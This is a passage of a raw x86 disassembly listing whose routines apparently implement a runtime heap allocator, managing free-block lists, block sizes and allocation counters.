  401d2a:	8b c3                	mov    %ebx,%eax
  401d2c:	5a                   	pop    %edx
  401d2d:	5e                   	pop    %esi
  401d2e:	5b                   	pop    %ebx
  401d2f:	c3                   	ret
  401d30:	53                   	push   %ebx
  401d31:	56                   	push   %esi
  401d32:	51                   	push   %ecx
  401d33:	8b d8                	mov    %eax,%ebx
  401d35:	33 f6                	xor    %esi,%esi
  401d37:	8b 03                	mov    (%ebx),%eax
  401d39:	a9 00 00 00 80       	test   $0x80000000,%eax
  401d3e:	74 0b                	je     0x401d4b
  401d40:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  401d45:	03 f0                	add    %eax,%esi
  401d47:	03 d8                	add    %eax,%ebx
  401d49:	8b 03                	mov    (%ebx),%eax
  401d4b:	a8 02                	test   $0x2,%al
  401d4d:	75 18                	jne    0x401d67
  401d4f:	89 1c 24             	mov    %ebx,(%esp)
  401d52:	8b 04 24             	mov    (%esp),%eax
  401d55:	e8 fe fd ff ff       	call   0x401b58
  401d5a:	8b 04 24             	mov    (%esp),%eax
  401d5d:	8b 40 08             	mov    0x8(%eax),%eax
  401d60:	03 f0                	add    %eax,%esi
  401d62:	03 d8                	add    %eax,%ebx
  401d64:	83 23 fe             	andl   $0xfffffffe,(%ebx)
  401d67:	8b c6                	mov    %esi,%eax
  401d69:	5a                   	pop    %edx
  401d6a:	5e                   	pop    %esi
  401d6b:	5b                   	pop    %ebx
  401d6c:	c3                   	ret
  401d6d:	8d 40 00             	lea    0x0(%eax),%eax
  401d70:	53                   	push   %ebx
  401d71:	56                   	push   %esi
  401d72:	57                   	push   %edi
  401d73:	55                   	push   %ebp
  401d74:	83 c4 f4             	add    $0xfffffff4,%esp
  401d77:	8b f2                	mov    %edx,%esi
  401d79:	8b e8                	mov    %eax,%ebp
  401d7b:	33 db                	xor    %ebx,%ebx
  401d7d:	8b c5                	mov    %ebp,%eax
  401d7f:	e8 68 fe ff ff       	call   0x401bec
  401d84:	89 44 24 08          	mov    %eax,0x8(%esp)
  401d88:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  401d8d:	0f 84 8f 00 00 00    	je     0x401e22
  401d93:	8b 44 24 08          	mov    0x8(%esp),%eax
  401d97:	8b 78 08             	mov    0x8(%eax),%edi
  401d9a:	8b c7                	mov    %edi,%eax
  401d9c:	8b 54 24 08          	mov    0x8(%esp),%edx
  401da0:	03 42 0c             	add    0xc(%edx),%eax
  401da3:	8b d0                	mov    %eax,%edx
  401da5:	8d 0c 2e             	lea    (%esi,%ebp,1),%ecx
  401da8:	2b d1                	sub    %ecx,%edx
  401daa:	83 fa 0c             	cmp    $0xc,%edx
  401dad:	7f 04                	jg     0x401db3
  401daf:	8b f0                	mov    %eax,%esi
  401db1:	2b f5                	sub    %ebp,%esi
  401db3:	8b c5                	mov    %ebp,%eax
  401db5:	2b c7                	sub    %edi,%eax
  401db7:	83 f8 0c             	cmp    $0xc,%eax
  401dba:	7d 16                	jge    0x401dd2
  401dbc:	8b 44 24 08          	mov    0x8(%esp),%eax
  401dc0:	8b d5                	mov    %ebp,%edx
  401dc2:	2b 50 08             	sub    0x8(%eax),%edx
  401dc5:	03 d6                	add    %esi,%edx
  401dc7:	8b cc                	mov    %esp,%ecx
  401dc9:	8b c7                	mov    %edi,%eax
  401dcb:	e8 1c fb ff ff       	call   0x4018ec
  401dd0:	eb 0f                	jmp    0x401de1
  401dd2:	8b cc                	mov    %esp,%ecx
  401dd4:	8b d6                	mov    %esi,%edx
  401dd6:	83 ea 04             	sub    $0x4,%edx
  401dd9:	8d 45 04             	lea    0x4(%ebp),%eax
  401ddc:	e8 0b fb ff ff       	call   0x4018ec
  401de1:	8b 3c 24             	mov    (%esp),%edi
  401de4:	85 ff                	test   %edi,%edi
  401de6:	74 3a                	je     0x401e22
  401de8:	8b d7                	mov    %edi,%edx
  401dea:	2b d5                	sub    %ebp,%edx
  401dec:	8b c5                	mov    %ebp,%eax
  401dee:	e8 3d fe ff ff       	call   0x401c30
  401df3:	8b 54 24 08          	mov    0x8(%esp),%edx
  401df7:	8b 52 08             	mov    0x8(%edx),%edx
  401dfa:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  401dfe:	03 51 0c             	add    0xc(%ecx),%edx
  401e01:	8b c7                	mov    %edi,%eax
  401e03:	03 44 24 04          	add    0x4(%esp),%eax
  401e07:	3b d0                	cmp    %eax,%edx
  401e09:	76 0a                	jbe    0x401e15
  401e0b:	8d 14 2e             	lea    (%esi,%ebp,1),%edx
  401e0e:	2b d0                	sub    %eax,%edx
  401e10:	e8 7b fe ff ff       	call   0x401c90
  401e15:	8b d4                	mov    %esp,%edx
  401e17:	8b 44 24 08          	mov    0x8(%esp),%eax
  401e1b:	e8 fc f4 ff ff       	call   0x40131c
  401e20:	b3 01                	mov    $0x1,%bl
  401e22:	8b c3                	mov    %ebx,%eax
  401e24:	83 c4 0c             	add    $0xc,%esp
  401e27:	5d                   	pop    %ebp
  401e28:	5f                   	pop    %edi
  401e29:	5e                   	pop    %esi
  401e2a:	5b                   	pop    %ebx
  401e2b:	c3                   	ret
  401e2c:	53                   	push   %ebx
  401e2d:	56                   	push   %esi
  401e2e:	83 c4 f4             	add    $0xfffffff4,%esp
  401e31:	8b da                	mov    %edx,%ebx
  401e33:	8b f0                	mov    %eax,%esi
  401e35:	89 34 24             	mov    %esi,(%esp)
  401e38:	8b 04 24             	mov    (%esp),%eax
  401e3b:	89 58 08             	mov    %ebx,0x8(%eax)
  401e3e:	8b 04 24             	mov    (%esp),%eax
  401e41:	03 c3                	add    %ebx,%eax
  401e43:	83 e8 0c             	sub    $0xc,%eax
  401e46:	89 58 08             	mov    %ebx,0x8(%eax)
  401e49:	81 fb 00 10 00 00    	cmp    $0x1000,%ebx
  401e4f:	7f 76                	jg     0x401ec7
  401e51:	8b c3                	mov    %ebx,%eax
  401e53:	85 c0                	test   %eax,%eax
  401e55:	79 03                	jns    0x401e5a
  401e57:	83 c0 03             	add    $0x3,%eax
  401e5a:	c1 f8 02             	sar    $0x2,%eax
  401e5d:	8b 15 0c 96 42 00    	mov    0x42960c,%edx
  401e63:	8b 54 82 f4          	mov    -0xc(%edx,%eax,4),%edx
  401e67:	89 54 24 04          	mov    %edx,0x4(%esp)
  401e6b:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  401e70:	75 23                	jne    0x401e95
  401e72:	8b 15 0c 96 42 00    	mov    0x42960c,%edx
  401e78:	8b 0c 24             	mov    (%esp),%ecx
  401e7b:	89 4c 82 f4          	mov    %ecx,-0xc(%edx,%eax,4)
  401e7f:	8b 04 24             	mov    (%esp),%eax
  401e82:	8b 14 24             	mov    (%esp),%edx
  401e85:	89 50 04             	mov    %edx,0x4(%eax)
  401e88:	8b 04 24             	mov    (%esp),%eax
  401e8b:	8b 14 24             	mov    (%esp),%edx
  401e8e:	89 10                	mov    %edx,(%eax)
  401e90:	e9 88 00 00 00       	jmp    0x401f1d
  401e95:	8b 44 24 04          	mov    0x4(%esp),%eax
  401e99:	8b 00                	mov    (%eax),%eax
  401e9b:	89 44 24 08          	mov    %eax,0x8(%esp)
  401e9f:	8b 04 24             	mov    (%esp),%eax
  401ea2:	8b 54 24 04          	mov    0x4(%esp),%edx
  401ea6:	89 50 04             	mov    %edx,0x4(%eax)
  401ea9:	8b 04 24             	mov    (%esp),%eax
  401eac:	8b 54 24 08          	mov    0x8(%esp),%edx
  401eb0:	89 10                	mov    %edx,(%eax)
  401eb2:	8b 44 24 04          	mov    0x4(%esp),%eax
  401eb6:	8b 14 24             	mov    (%esp),%edx
  401eb9:	89 10                	mov    %edx,(%eax)
  401ebb:	8b 44 24 08          	mov    0x8(%esp),%eax
  401ebf:	8b 14 24             	mov    (%esp),%edx
  401ec2:	89 50 04             	mov    %edx,0x4(%eax)
  401ec5:	eb 56                	jmp    0x401f1d
  401ec7:	81 fb 00 3c 00 00    	cmp    $0x3c00,%ebx
  401ecd:	7c 0d                	jl     0x401edc
  401ecf:	8b d3                	mov    %ebx,%edx
  401ed1:	8b c6                	mov    %esi,%eax
  401ed3:	e8 98 fe ff ff       	call   0x401d70
  401ed8:	84 c0                	test   %al,%al
  401eda:	75 41                	jne    0x401f1d
  401edc:	a1 00 96 42 00       	mov    0x429600,%eax
  401ee1:	89 44 24 04          	mov    %eax,0x4(%esp)
  401ee5:	8b 04 24             	mov    (%esp),%eax
  401ee8:	a3 00 96 42 00       	mov    %eax,0x429600
  401eed:	8b 44 24 04          	mov    0x4(%esp),%eax
  401ef1:	8b 00                	mov    (%eax),%eax
  401ef3:	89 44 24 08          	mov    %eax,0x8(%esp)
  401ef7:	8b 04 24             	mov    (%esp),%eax
  401efa:	8b 54 24 04          	mov    0x4(%esp),%edx
  401efe:	89 50 04             	mov    %edx,0x4(%eax)
  401f01:	8b 04 24             	mov    (%esp),%eax
  401f04:	8b 54 24 08          	mov    0x8(%esp),%edx
  401f08:	89 10                	mov    %edx,(%eax)
  401f0a:	8b 44 24 04          	mov    0x4(%esp),%eax
  401f0e:	8b 14 24             	mov    (%esp),%edx
  401f11:	89 10                	mov    %edx,(%eax)
  401f13:	8b 44 24 08          	mov    0x8(%esp),%eax
  401f17:	8b 14 24             	mov    (%esp),%edx
  401f1a:	89 50 04             	mov    %edx,0x4(%eax)
  401f1d:	83 c4 0c             	add    $0xc,%esp
  401f20:	5e                   	pop    %esi
  401f21:	5b                   	pop    %ebx
  401f22:	c3                   	ret
  401f23:	90                   	nop
  401f24:	83 3d 04 96 42 00 00 	cmpl   $0x0,0x429604
  401f2b:	7e 40                	jle    0x401f6d
  401f2d:	83 3d 04 96 42 00 0c 	cmpl   $0xc,0x429604
  401f34:	7d 0c                	jge    0x401f42
  401f36:	c7 05 b0 95 42 00 07 	movl   $0x7,0x4295b0
  401f3d:	00 00 00 
  401f40:	eb 2b                	jmp    0x401f6d
  401f42:	a1 04 96 42 00       	mov    0x429604,%eax
  401f47:	83 c8 02             	or     $0x2,%eax
  401f4a:	8b 15 08 96 42 00    	mov    0x429608,%edx
  401f50:	89 02                	mov    %eax,(%edx)
  401f52:	a1 08 96 42 00       	mov    0x429608,%eax
  401f57:	83 c0 04             	add    $0x4,%eax
  401f5a:	e8 0d fd ff ff       	call   0x401c6c
  401f5f:	33 c0                	xor    %eax,%eax
  401f61:	a3 08 96 42 00       	mov    %eax,0x429608
  401f66:	33 c0                	xor    %eax,%eax
  401f68:	a3 04 96 42 00       	mov    %eax,0x429604
  401f6d:	c3                   	ret
  401f6e:	8b c0                	mov    %eax,%eax
  401f70:	53                   	push   %ebx
  401f71:	56                   	push   %esi
  401f72:	57                   	push   %edi
  401f73:	83 c4 f0             	add    $0xfffffff0,%esp
  401f76:	8b f0                	mov    %eax,%esi
  401f78:	8d 3c 24             	lea    (%esp),%edi
  401f7b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401f7c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401f7d:	8b fc                	mov    %esp,%edi
  401f7f:	e8 a0 ff ff ff       	call   0x401f24
  401f84:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  401f88:	8b d7                	mov    %edi,%edx
  401f8a:	b8 10 96 42 00       	mov    $0x429610,%eax
  401f8f:	e8 00 f3 ff ff       	call   0x401294
  401f94:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  401f98:	85 db                	test   %ebx,%ebx
  401f9a:	75 04                	jne    0x401fa0
  401f9c:	33 c0                	xor    %eax,%eax
  401f9e:	eb 52                	jmp    0x401ff2
  401fa0:	8b 07                	mov    (%edi),%eax
  401fa2:	3b d8                	cmp    %eax,%ebx
  401fa4:	73 0a                	jae    0x401fb0
  401fa6:	e8 0d fd ff ff       	call   0x401cb8
  401fab:	29 07                	sub    %eax,(%edi)
  401fad:	01 47 04             	add    %eax,0x4(%edi)
  401fb0:	8b 07                	mov    (%edi),%eax
  401fb2:	03 47 04             	add    0x4(%edi),%eax
  401fb5:	8b f3                	mov    %ebx,%esi
  401fb7:	03 74 24 0c          	add    0xc(%esp),%esi
  401fbb:	3b c6                	cmp    %esi,%eax
  401fbd:	73 08                	jae    0x401fc7
  401fbf:	e8 6c fd ff ff       	call   0x401d30
  401fc4:	01 47 04             	add    %eax,0x4(%edi)
  401fc7:	8b 07                	mov    (%edi),%eax
  401fc9:	03 47 04             	add    0x4(%edi),%eax
  401fcc:	3b f0                	cmp    %eax,%esi
  401fce:	75 11                	jne    0x401fe1
  401fd0:	83 e8 04             	sub    $0x4,%eax
  401fd3:	ba 04 00 00 00       	mov    $0x4,%edx
  401fd8:	e8 53 fc ff ff       	call   0x401c30
  401fdd:	83 6f 04 04          	subl   $0x4,0x4(%edi)
  401fe1:	8b 07                	mov    (%edi),%eax
  401fe3:	a3 08 96 42 00       	mov    %eax,0x429608
  401fe8:	8b 47 04             	mov    0x4(%edi),%eax
  401feb:	a3 04 96 42 00       	mov    %eax,0x429604
  401ff0:	b0 01                	mov    $0x1,%al
  401ff2:	83 c4 10             	add    $0x10,%esp
  401ff5:	5f                   	pop    %edi
  401ff6:	5e                   	pop    %esi
  401ff7:	5b                   	pop    %ebx
  401ff8:	c3                   	ret
  401ff9:	8d 40 00             	lea    0x0(%eax),%eax
  401ffc:	53                   	push   %ebx
  401ffd:	83 c4 f8             	add    $0xfffffff8,%esp
  402000:	8b d8                	mov    %eax,%ebx
  402002:	8b d4                	mov    %esp,%edx
  402004:	8d 43 04             	lea    0x4(%ebx),%eax
  402007:	e8 f4 f6 ff ff       	call   0x401700
  40200c:	83 3c 24 00          	cmpl   $0x0,(%esp)
  402010:	74 0b                	je     0x40201d
  402012:	8b c4                	mov    %esp,%eax
  402014:	e8 57 ff ff ff       	call   0x401f70
  402019:	84 c0                	test   %al,%al
  40201b:	75 04                	jne    0x402021
  40201d:	33 c0                	xor    %eax,%eax
  40201f:	eb 02                	jmp    0x402023
  402021:	b0 01                	mov    $0x1,%al
  402023:	59                   	pop    %ecx
  402024:	5a                   	pop    %edx
  402025:	5b                   	pop    %ebx
  402026:	c3                   	ret
  402027:	90                   	nop
  402028:	53                   	push   %ebx
  402029:	56                   	push   %esi
  40202a:	83 c4 f8             	add    $0xfffffff8,%esp
  40202d:	8b f2                	mov    %edx,%esi
  40202f:	8b d8                	mov    %eax,%ebx
  402031:	8b cc                	mov    %esp,%ecx
  402033:	8d 56 04             	lea    0x4(%esi),%edx
  402036:	8b c3                	mov    %ebx,%eax
  402038:	e8 6b f7 ff ff       	call   0x4017a8
  40203d:	83 3c 24 00          	cmpl   $0x0,(%esp)
  402041:	74 0b                	je     0x40204e
  402043:	8b c4                	mov    %esp,%eax
  402045:	e8 26 ff ff ff       	call   0x401f70
  40204a:	84 c0                	test   %al,%al
  40204c:	75 04                	jne    0x402052
  40204e:	33 c0                	xor    %eax,%eax
  402050:	eb 02                	jmp    0x402054
  402052:	b0 01                	mov    $0x1,%al
  402054:	59                   	pop    %ecx
  402055:	5a                   	pop    %edx
  402056:	5e                   	pop    %esi
  402057:	5b                   	pop    %ebx
  402058:	c3                   	ret
  402059:	8d 40 00             	lea    0x0(%eax),%eax
  40205c:	51                   	push   %ecx
  40205d:	8b d4                	mov    %esp,%edx
  40205f:	33 c9                	xor    %ecx,%ecx
  402061:	89 0a                	mov    %ecx,(%edx)
  402063:	85 c0                	test   %eax,%eax
  402065:	79 03                	jns    0x40206a
  402067:	83 c0 03             	add    $0x3,%eax
  40206a:	c1 f8 02             	sar    $0x2,%eax
  40206d:	3d 00 04 00 00       	cmp    $0x400,%eax
  402072:	7f 19                	jg     0x40208d
  402074:	8b 0d 0c 96 42 00    	mov    0x42960c,%ecx
  40207a:	8b 4c 81 f4          	mov    -0xc(%ecx,%eax,4),%ecx
  40207e:	89 0a                	mov    %ecx,(%edx)
  402080:	83 3a 00             	cmpl   $0x0,(%edx)
  402083:	75 08                	jne    0x40208d
  402085:	40                   	inc    %eax
  402086:	3d 01 04 00 00       	cmp    $0x401,%eax
  40208b:	75 e7                	jne    0x402074
  40208d:	8b 02                	mov    (%edx),%eax
  40208f:	5a                   	pop    %edx
  402090:	c3                   	ret
  402091:	8d 40 00             	lea    0x0(%eax),%eax
  402094:	53                   	push   %ebx
  402095:	56                   	push   %esi
  402096:	57                   	push   %edi
  402097:	55                   	push   %ebp
  402098:	83 c4 f4             	add    $0xfffffff4,%esp
  40209b:	8b d8                	mov    %eax,%ebx
  40209d:	8d 74 24 08          	lea    0x8(%esp),%esi
  4020a1:	bf 00 96 42 00       	mov    $0x429600,%edi
  4020a6:	bd 04 96 42 00       	mov    $0x429604,%ebp
  4020ab:	a1 f8 95 42 00       	mov    0x4295f8,%eax
  4020b0:	89 06                	mov    %eax,(%esi)
  4020b2:	8b 06                	mov    (%esi),%eax
  4020b4:	3b 58 08             	cmp    0x8(%eax),%ebx
  4020b7:	0f 8e ab 00 00 00    	jle    0x402168
  4020bd:	8b 07                	mov    (%edi),%eax
  4020bf:	89 06                	mov    %eax,(%esi)
  4020c1:	8b 06                	mov    (%esi),%eax
  4020c3:	8b 40 08             	mov    0x8(%eax),%eax
  4020c6:	3b d8                	cmp    %eax,%ebx
  4020c8:	0f 8e 9a 00 00 00    	jle    0x402168
  4020ce:	8b 16                	mov    (%esi),%edx
  4020d0:	89 5a 08             	mov    %ebx,0x8(%edx)
  4020d3:	8b 16                	mov    (%esi),%edx
  4020d5:	8b 52 04             	mov    0x4(%edx),%edx
  4020d8:	89 16                	mov    %edx,(%esi)
  4020da:	8b 16                	mov    (%esi),%edx
  4020dc:	3b 5a 08             	cmp    0x8(%edx),%ebx
  4020df:	7f f2                	jg     0x4020d3
  4020e1:	8b 17                	mov    (%edi),%edx
  4020e3:	89 42 08             	mov    %eax,0x8(%edx)
  4020e6:	8b 06                	mov    (%esi),%eax
  4020e8:	3b 07                	cmp    (%edi),%eax
  4020ea:	74 06                	je     0x4020f2
  4020ec:	8b 06                	mov    (%esi),%eax
  4020ee:	89 07                	mov    %eax,(%edi)
  4020f0:	eb 76                	jmp    0x402168
  4020f2:	81 fb 00 10 00 00    	cmp    $0x1000,%ebx
  4020f8:	7f 0e                	jg     0x402108
  4020fa:	8b c3                	mov    %ebx,%eax
  4020fc:	e8 5b ff ff ff       	call   0x40205c
  402101:	89 06                	mov    %eax,(%esi)
  402103:	83 3e 00             	cmpl   $0x0,(%esi)
  402106:	75 60                	jne    0x402168
  402108:	8b c3                	mov    %ebx,%eax
  40210a:	e8 ed fe ff ff       	call   0x401ffc
  40210f:	84 c0                	test   %al,%al
  402111:	75 0a                	jne    0x40211d
  402113:	33 c0                	xor    %eax,%eax
  402115:	89 04 24             	mov    %eax,(%esp)
  402118:	e9 b4 00 00 00       	jmp    0x4021d1
  40211d:	3b 5d 00             	cmp    0x0(%ebp),%ebx
  402120:	7f 89                	jg     0x4020ab
  402122:	29 5d 00             	sub    %ebx,0x0(%ebp)
  402125:	83 7d 00 0c          	cmpl   $0xc,0x0(%ebp)
  402129:	7d 08                	jge    0x402133
  40212b:	03 5d 00             	add    0x0(%ebp),%ebx
  40212e:	33 c0                	xor    %eax,%eax
  402130:	89 45 00             	mov    %eax,0x0(%ebp)
  402133:	a1 08 96 42 00       	mov    0x429608,%eax
  402138:	89 44 24 04          	mov    %eax,0x4(%esp)
  40213c:	01 1d 08 96 42 00    	add    %ebx,0x429608
  402142:	8b c3                	mov    %ebx,%eax
  402144:	83 c8 02             	or     $0x2,%eax
  402147:	8b 54 24 04          	mov    0x4(%esp),%edx
  40214b:	89 02                	mov    %eax,(%edx)
  40214d:	8b 44 24 04          	mov    0x4(%esp),%eax
  402151:	83 c0 04             	add    $0x4,%eax
  402154:	89 04 24             	mov    %eax,(%esp)
  402157:	ff 05 9c 95 42 00    	incl   0x42959c
  40215d:	83 eb 04             	sub    $0x4,%ebx
  402160:	01 1d a0 95 42 00    	add    %ebx,0x4295a0
  402166:	eb 69                	jmp    0x4021d1
  402168:	8b 06                	mov    (%esi),%eax
  40216a:	e8 e9 f9 ff ff       	call   0x401b58
  40216f:	8b 06                	mov    (%esi),%eax
  402171:	8b 50 08             	mov    0x8(%eax),%edx
  402174:	8b c2                	mov    %edx,%eax
  402176:	2b c3                	sub    %ebx,%eax
  402178:	83 f8 0c             	cmp    $0xc,%eax
  40217b:	7c 0c                	jl     0x402189
  40217d:	8b 16                	mov    (%esi),%edx
  40217f:	03 d3                	add    %ebx,%edx
  402181:	92                   	xchg   %eax,%edx
  402182:	e8 a5 fc ff ff       	call   0x401e2c
  402187:	eb 1e                	jmp    0x4021a7
  402189:	8b da                	mov    %edx,%ebx
  40218b:	8b 06                	mov    (%esi),%eax
  40218d:	3b 07                	cmp    (%edi),%eax
  40218f:	75 07                	jne    0x402198
  402191:	8b 06                	mov    (%esi),%eax
  402193:	8b 40 04             	mov    0x4(%eax),%eax
  402196:	89 07                	mov    %eax,(%edi)
  402198:	8b 06                	mov    (%esi),%eax
  40219a:	03 c3                	add    %ebx,%eax
  40219c:	89 44 24 04          	mov    %eax,0x4(%esp)
  4021a0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4021a4:	83 20 fe             	andl   $0xfffffffe,(%eax)
  4021a7:	8b 06                	mov    (%esi),%eax
  4021a9:	89 44 24 04          	mov    %eax,0x4(%esp)
  4021ad:	8b c3                	mov    %ebx,%eax
  4021af:	83 c8 02             	or     $0x2,%eax
  4021b2:	8b 54 24 04          	mov    0x4(%esp),%edx
  4021b6:	89 02                	mov    %eax,(%edx)
  4021b8:	8b 44 24 04          	mov    0x4(%esp),%eax
  4021bc:	83 c0 04             	add    $0x4,%eax
  4021bf:	89 04 24             	mov    %eax,(%esp)
  4021c2:	ff 05 9c 95 42 00    	incl   0x42959c
  4021c8:	83 eb 04             	sub    $0x4,%ebx
  4021cb:	01 1d a0 95 42 00    	add    %ebx,0x4295a0
  4021d1:	8b 04 24             	mov    (%esp),%eax
  4021d4:	83 c4 0c             	add    $0xc,%esp
  4021d7:	5d                   	pop    %ebp
  4021d8:	5f                   	pop    %edi
  4021d9:	5e                   	pop    %esi
  4021da:	5b                   	pop    %ebx
  4021db:	c3                   	ret
  4021dc:	55                   	push   %ebp
  4021dd:	8b ec                	mov    %esp,%ebp
  4021df:	83 c4 ec             	add    $0xffffffec,%esp
  4021e2:	53                   	push   %ebx
  4021e3:	8b d8                	mov    %eax,%ebx
  4021e5:	80 3d ac 95 42 00 00 	cmpb   $0x0,0x4295ac
  4021ec:	75 09                	jne    0x4021f7
  4021ee:	e8 8d f7 ff ff       	call   0x401980
  4021f3:	84 c0                	test   %al,%al
  4021f5:	74 08                	je     0x4021ff
  4021f7:	81 fb f8 ff ff 7f    	cmp    $0x7ffffff8,%ebx
  4021fd:	7e 0a                	jle    0x402209
  4021ff:	33 c0                	xor    %eax,%eax
  402201:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402204:	e9 76 01 00 00       	jmp    0x40237f
  402209:	33 d2                	xor    %edx,%edx
  40220b:	55                   	push   %ebp
  40220c:	68 78 23 40 00       	push   $0x402378
  402211:	64 ff 32             	push   %fs:(%edx)
  402214:	64 89 22             	mov    %esp,%fs:(%edx)
  402217:	80 3d 35 90 42 00 00 	cmpb   $0x0,0x429035
  40221e:	74 0a                	je     0x40222a
  402220:	68 b4 95 42 00       	push   $0x4295b4
  402225:	e8 36 ef ff ff       	call   0x401160
  40222a:	83 c3 07             	add    $0x7,%ebx
  40222d:	83 e3 fc             	and    $0xfffffffc,%ebx
  402230:	83 fb 0c             	cmp    $0xc,%ebx
  402233:	7d 05                	jge    0x40223a
  402235:	bb 0c 00 00 00       	mov    $0xc,%ebx
  40223a:	81 fb 00 10 00 00    	cmp    $0x1000,%ebx
  402240:	0f 8f ac 00 00 00    	jg     0x4022f2
  402246:	8b c3                	mov    %ebx,%eax
  402248:	85 c0                	test   %eax,%eax
  40224a:	79 03                	jns    0x40224f
  40224c:	83 c0 03             	add    $0x3,%eax
  40224f:	c1 f8 02             	sar    $0x2,%eax
  402252:	8b 15 0c 96 42 00    	mov    0x42960c,%edx
  402258:	8b 54 82 f4          	mov    -0xc(%edx,%eax,4),%edx
  40225c:	89 55 f8             	mov    %edx,-0x8(%ebp)
  40225f:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  402263:	0f 84 89 00 00 00    	je     0x4022f2
  402269:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40226c:	03 d3                	add    %ebx,%edx
  40226e:	89 55 ec             	mov    %edx,-0x14(%ebp)
  402271:	8b 55 ec             	mov    -0x14(%ebp),%edx
  402274:	83 22 fe             	andl   $0xfffffffe,(%edx)
  402277:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40227a:	8b 52 04             	mov    0x4(%edx),%edx
  40227d:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402280:	8b 55 f0             	mov    -0x10(%ebp),%edx
  402283:	3b 55 f8             	cmp    -0x8(%ebp),%edx
  402286:	75 0e                	jne    0x402296
  402288:	8b 15 0c 96 42 00    	mov    0x42960c,%edx
  40228e:	33 c9                	xor    %ecx,%ecx
  402290:	89 4c 82 f4          	mov    %ecx,-0xc(%edx,%eax,4)
  402294:	eb 26                	jmp    0x4022bc
  402296:	8b 15 0c 96 42 00    	mov    0x42960c,%edx
  40229c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40229f:	89 4c 82 f4          	mov    %ecx,-0xc(%edx,%eax,4)
  4022a3:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4022a6:	8b 00                	mov    (%eax),%eax
  4022a8:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4022ab:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4022ae:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4022b1:	89 50 04             	mov    %edx,0x4(%eax)
  4022b4:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4022b7:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4022ba:	89 10                	mov    %edx,(%eax)
  4022bc:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4022bf:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4022c2:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4022c5:	8b 40 08             	mov    0x8(%eax),%eax
  4022c8:	83 c8 02             	or     $0x2,%eax
  4022cb:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4022ce:	89 02                	mov    %eax,(%edx)
  4022d0:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4022d3:	83 c0 04             	add    $0x4,%eax
  4022d6:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4022d9:	ff 05 9c 95 42 00    	incl   0x42959c
  4022df:	83 eb 04             	sub    $0x4,%ebx
  4022e2:	01 1d a0 95 42 00    	add    %ebx,0x4295a0
  4022e8:	e8 d7 0e 00 00       	call   0x4031c4
  4022ed:	e9 8d 00 00 00       	jmp    0x40237f
  4022f2:	3b 1d 04 96 42 00    	cmp    0x429604,%ebx
  4022f8:	7f 53                	jg     0x40234d
  4022fa:	29 1d 04 96 42 00    	sub    %ebx,0x429604
  402300:	83 3d 04 96 42 00 0c 	cmpl   $0xc,0x429604
  402307:	7d 0d                	jge    0x402316
  402309:	03 1d 04 96 42 00    	add    0x429604,%ebx
  40230f:	33 c0                	xor    %eax,%eax
  402311:	a3 04 96 42 00       	mov    %eax,0x429604
  402316:	a1 08 96 42 00       	mov    0x429608,%eax
  40231b:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40231e:	01 1d 08 96 42 00    	add    %ebx,0x429608
  402324:	8b c3                	mov    %ebx,%eax
  402326:	83 c8 02             	or     $0x2,%eax
  402329:	8b 55 ec             	mov    -0x14(%ebp),%edx
  40232c:	89 02                	mov    %eax,(%edx)
  40232e:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402331:	83 c0 04             	add    $0x4,%eax
  402334:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402337:	ff 05 9c 95 42 00    	incl   0x42959c
  40233d:	83 eb 04             	sub    $0x4,%ebx
  402340:	01 1d a0 95 42 00    	add    %ebx,0x4295a0
  402346:	e8 79 0e 00 00       	call   0x4031c4
  40234b:	eb 32                	jmp    0x40237f
  40234d:	8b c3                	mov    %ebx,%eax
  40234f:	e8 40 fd ff ff       	call   0x402094
  402354:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402357:	33 c0                	xor    %eax,%eax
  402359:	5a                   	pop    %edx
  40235a:	59                   	pop    %ecx
  40235b:	59                   	pop    %ecx
  40235c:	64 89 10             	mov    %edx,%fs:(%eax)
  40235f:	68 7f 23 40 00       	push   $0x40237f
  402364:	80 3d 35 90 42 00 00 	cmpb   $0x0,0x429035
  40236b:	74 0a                	je     0x402377
  40236d:	68 b4 95 42 00       	push   $0x4295b4
  402372:	e8 f1 ed ff ff       	call   0x401168
  402377:	c3                   	ret
  402378:	e9 8b 0d 00 00       	jmp    0x403108
  40237d:	eb e5                	jmp    0x402364
  40237f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402382:	5b                   	pop    %ebx
  402383:	8b e5                	mov    %ebp,%esp
  402385:	5d                   	pop    %ebp
  402386:	c3                   	ret
  402387:	90                   	nop
  402388:	55                   	push   %ebp
  402389:	8b ec                	mov    %esp,%ebp
  40238b:	83 c4 f0             	add    $0xfffffff0,%esp
  40238e:	53                   	push   %ebx
  40238f:	8b d8                	mov    %eax,%ebx
  402391:	33 c0                	xor    %eax,%eax
  402393:	a3 b0 95 42 00       	mov    %eax,0x4295b0
  402398:	80 3d ac 95 42 00 00 	cmpb   $0x0,0x4295ac
  40239f:	75 1f                	jne    0x4023c0
  4023a1:	e8 da f5 ff ff       	call   0x401980
  4023a6:	84 c0                	test   %al,%al
  4023a8:	75 16                	jne    0x4023c0
